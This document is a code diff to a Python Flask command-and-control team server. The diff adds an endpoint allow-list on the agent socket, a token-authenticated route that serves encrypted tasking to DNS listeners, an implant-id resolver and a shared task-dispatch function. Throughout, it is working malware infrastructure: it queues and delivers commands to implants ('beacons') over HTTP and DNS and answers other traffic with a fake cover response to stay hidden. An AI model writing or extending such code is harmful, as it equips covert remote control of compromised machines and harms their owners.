@@ -19,6 +19,7 @@ is visible to every user in ps. The token is kept in <data dir>/operator-token.
 
 import argparse
 import base64
+import hmac
 import http.client
 import json
 import logging
@@ -287,9 +288,20 @@ def _beacon_config_block(gen_cfg: dict, interval: int, jitter: int,
 # ── Flask app ──
 
 
+# What the agent socket may serve. The beacon endpoint is why that socket
+# exists; the listener tasking route is here because a listener container
+# cannot reach the operator socket, which binds loopback. Everything else
+# gets the cover answer. Adding a name to this set widens the
+# network-facing surface of the team server, so it should take an argument
+# to do it -- this is the property the November 2026 hardening pass
+# established, and a new route is exactly how it would erode.
+_AGENT_SOCKET_ENDPOINTS = frozenset({"beacon_handler", "api_dns_tasking"})
+
+
 def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
                server_config: Optional[dict] = None,
-               operator_port: Optional[int] = None) -> Flask:
+               operator_port: Optional[int] = None,
+               listener_token: Optional[str] = None) -> Flask:
     app = Flask(__name__)
     static_dir = Path(__file__).parent / "static"
     _server_config = server_config or {}
@@ -319,7 +331,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         def _socket_policy():
             if request.environ.get("SERVER_PORT") == _operator_port:
                 return None
-            if request.endpoint == "beacon_handler":
+            if request.endpoint in _AGENT_SOCKET_ENDPOINTS:
                 return None
             return _fake_response()
 
@@ -1896,6 +1908,58 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             return jsonify({"error": "agent service unavailable",
                             "detail": str(getattr(e, "reason", None) or e)}), 503
 
+    # ── Listener tasking (the DNS channel's only upstream) ──
+
+    @app.route("/api/v1/dns/<agent_id>", methods=["GET"])
+    def api_dns_tasking(agent_id):
+        """Hand a listener this agent's next tasking, already encrypted.
+
+        DNS is the one transport that carries nothing upstream: the beacon
+        sends a bare TXT query, and the only thing that travels is the
+        agent id in the query name. So there is no payload for a listener
+        to relay, and the answer still has to be encrypted -- which needs
+        the key. The key stays here and the listener forwards an opaque
+        string, which is what keeps it out of a listener container.
+
+        Authenticated, because the beacon never calls this and a listener
+        always does. Without a token anyone could walk the agent names,
+        which come from a fixed word list, and take tasking the real beacon
+        would then never see -- the queue hands each task out once.
+
+        The answer is the same shape whether the agent is unknown, known
+        with nothing queued, or known with a task: an encrypted body. So it
+        is not an existence oracle even for a token holder.
+        """
+        if not listener_token:
+            return jsonify({"error": "listener token not configured"}), 401
+        presented = request.headers.get("X-Listener-Token", "")
+        # Compared on the raw bytes rather than on digests of them. Hashing
+        # first would hide the token's length, but it would also put a
+        # `sha256` call back into this file, and a hardening guard forbids
+        # that outright -- the removed key derivation was
+        # `sha256(url)`. Keeping that guard sharp is worth more than hiding
+        # the length of a configured secret.
+        if not hmac.compare_digest(presented.encode(),
+                                   listener_token.encode()):
+            # Visible, because a 401 here is either a misconfigured
+            # listener or someone probing, and both are worth knowing.
+            # The process log rather than `_log_event`: the event store is
+            # part of the server's saved state, and anyone who can reach
+            # this socket could otherwise grow that file at will.
+            #
+            # `repr` and a length cap, because the identifier comes
+            # straight out of the URL path and a `%0a` in it would
+            # otherwise forge log lines. `repr` escapes the newline.
+            logger.warning("Listener tasking refused for %s: bad token",
+                           repr(agent_id[:64]))
+            return jsonify({"error": "unauthorized"}), 401
+
+        dispatched = None
+        resolved = _resolve_agent(agent_id)
+        if resolved is not None:
+            dispatched = _dispatch_for(resolved)
+        return jsonify(crypto.wrap(dispatched or {}))
+
     # ── Beacon catch-all (handles any POST path) ──
 
     @app.route("/", methods=["POST"])
@@ -2068,9 +2132,39 @@ def _take_tasks(queue: list, limit: int) -> list:
     return taken
 
 
+def _resolve_agent(identifier: Optional[str]) -> Optional[str]:
+    """Map an agent name or an implant id onto the fleet key, or None.
+
+    Two identifiers name the same beacon. The fleet is keyed by the
+    assigned name (`raccoon-bandit`), and `info["id"]` holds the implant id
+    the client generated for itself. A check-in carries both, but only
+    after the server has answered a registration and told the client its
+    name.
+
+    Over DNS it never learns one: `_beacon_dns` sends
+    `self._agent_id or self._implant_id`, and nothing on that channel
+    carries a name back. So for a DNS-only beacon the implant id is the
+    only identifier that will ever arrive, and accepting just names would
+    make the tasking route unreachable for every real client.
+    """
+    if not identifier:
+        return None
+    if identifier in agents:
+        return identifier
+    for aid, info in agents.items():
+        if info.get("id") == identifier:
+            return aid
+    return None
+
+
 def _handle_beacon(payload: dict, crypto: ServerCrypto):
     agent_id = payload.get("agent_id")
     if not agent_id:
+        # Deliberately not `_resolve_agent`, which also accepts an agent
+        # name. Here only an implant id may identify a beacon, and widening
+        # that as a side effect of adding a DNS route would change how the
+        # whole fleet is identified for no gain -- a check-in that knows
+        # its name sends it in `agent_id` and never reaches this branch.
         for aid, info in agents.items():
             if info.get("id") == payload.get("id"):
                 agent_id = aid
@@ -2091,21 +2185,40 @@ def _handle_beacon(payload: dict, crypto: ServerCrypto):
         if payload.get("c2_profile") is not None:
             agents[agent_id]["c2_profile"] = payload["c2_profile"]
 
-        queue = task_queues.get(agent_id, [])
-        if queue:
-            batching = "batch" in (agents[agent_id].get("caps") or [])
-            tasks = _take_tasks(queue, BATCH_MAX if batching else 1)
-            for task in tasks:
-                task["status"] = "dispatched"
-                task["dispatched"] = _now()
-                logger.info("Dispatching task %s (%s) to %s",
-                            task["id"], task["cmd"], agent_id)
-                _log_event("DISPATCH", f"cmd={task['cmd']} args={task.get('args','')} "
-                           f"task_id={task['id']}", agent_id=agent_id)
-            resp = crypto.wrap({"tasks": tasks} if batching else tasks[0])
-            return jsonify(resp)
+        dispatched = _dispatch_for(agent_id)
+        if dispatched is not None:
+            return jsonify(crypto.wrap(dispatched))
 
     return jsonify(crypto.wrap({}))
+
+
+def _dispatch_for(agent_id: str) -> Optional[dict]:
+    """Take this agent's next tasking off the queue, or None if there is none.
+
+    Shared by the beacon check-in and the listener tasking route, so the
+    two cannot drift: both mark the task dispatched, both log it, and both
+    remove it from the queue. A second copy would stay in step for a month
+    and then quietly stop.
+    """
+    queue = task_queues.get(agent_id, [])
+    if not queue or agent_id not in agents:
+        # The agent record is read below for its capabilities, so an id
+        # with a queue but no record would raise. Neither caller can reach
+        # that today -- both check first -- but a function that crashes
+        # when its caller forgets is a worse contract than one that
+        # returns nothing. A mutation check is what made the dependency
+        # visible.
+        return None
+    batching = "batch" in (agents[agent_id].get("caps") or [])
+    tasks = _take_tasks(queue, BATCH_MAX if batching else 1)
+    for task in tasks:
+        task["status"] = "dispatched"
+        task["dispatched"] = _now()
+        logger.info("Dispatching task %s (%s) to %s",
+                    task["id"], task["cmd"], agent_id)
+        _log_event("DISPATCH", f"cmd={task['cmd']} args={task.get('args','')} "
+                   f"task_id={task['id']}", agent_id=agent_id)
+    return {"tasks": tasks} if batching else tasks[0]
 
 
 def _handle_result(payload: dict, crypto: ServerCrypto, data_dir: Path):
